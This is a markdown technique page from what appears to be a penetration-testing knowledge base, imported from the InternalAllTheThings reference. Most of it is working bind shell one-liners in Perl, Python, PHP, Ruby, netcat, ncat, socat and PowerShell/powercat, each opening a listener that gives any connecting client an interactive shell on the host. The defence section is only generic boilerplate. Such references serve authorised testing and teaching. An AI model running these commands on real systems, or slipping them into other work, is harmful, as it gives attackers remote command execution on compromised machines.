---
title: Bind Shell
type: technique
tags: [exploitation, network, reference-import, reverse-shell]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Bind Shell

## What it is

Technical reference for **Bind Shell** collected from InternalAllTheThings during an internal/cloud assessment ingest.

## How it works

A bind shell listens on a port on the target machine and executes a shell for any client that connects to it, inverting the direction of the shell initiation compared to a reverse shell. The attacker connects outbound from their machine to the listener on the compromised host, requiring that the target's firewall permits inbound connections on the listening port. Bind shells are useful when outbound connections from the target are blocked but inbound connections to the target are allowed, though they are more detectable than reverse shells due to the persistent open listener.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## Summary

* [Bind Shell](#bind-shell)
    * [Perl](#perl)
    * [Python](#python)
    * [PHP](#php)
    * [Ruby](#ruby)
    * [Netcat Traditional](#netcat-traditional)
    * [Netcat OpenBsd](#netcat-openbsd)
    * [Ncat](#ncat)
    * [Socat](#socat)
    * [Powershell](#powershell)

## Perl

```perl
perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\
close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```

## Python

Single line :

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

Expanded version :

```python
import socket as s,subprocess as sp;

s1 = s.socket(s.AF_INET, s.SOCK_STREAM);
s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1);
s1.bind(("0.0.0.0", 51337));
s1.listen(1);
c, a = s1.accept();

while True: 
    d = c.recv(1024).decode();
    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE);
    c.sendall(p.stdout.read()+p.stderr.read())
```

## PHP

```php
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",51337);\
socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);\
    socket_write($cl,$m,strlen($m));}}'
```

## Ruby

```ruby
ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
```

## Netcat Traditional

```powershell
nc -nlvp 51337 -e /bin/bash
```

## Netcat OpenBsd

```powershell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 51337 >/tmp/f
```

## Ncat

```powershell
ncat -nlvp 51337 -e /bin/bash
```

## Socat

```powershell
user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 
user@victim$ socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

## Powershell

```powershell
https://github.com/besimorhino/powercat

# Victim (listen)
. .\powercat.ps1
powercat -l -p 7002 -ep

# Connect from attacker
. .\powercat.ps1
powercat -c 127.0.0.1 -p 7002
```

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
